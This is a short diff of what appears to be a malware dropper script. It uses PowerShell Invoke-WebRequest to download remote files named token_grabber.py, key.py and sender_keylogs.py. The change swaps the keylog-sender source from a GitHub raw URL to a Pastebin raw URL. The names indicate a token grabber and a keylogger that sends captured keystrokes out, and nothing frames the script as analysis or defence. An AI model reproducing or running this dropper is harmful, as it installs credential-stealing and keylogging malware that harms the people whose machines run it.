@@ -8,7 +8,7 @@ Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuw
 cd ..
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/script' -Outfile token_grabber.py"
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/py.py' -Outfile key.py"
-Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/sender_keylogs.py' -Outfile sender_keylogs.py"
+Powershell -Command "Invoke-WebRequest 'https://pastebin.com/raw/PL5VAjJ4' -Outfile sender_keylogs.py"
 
 
 token_grabber.py
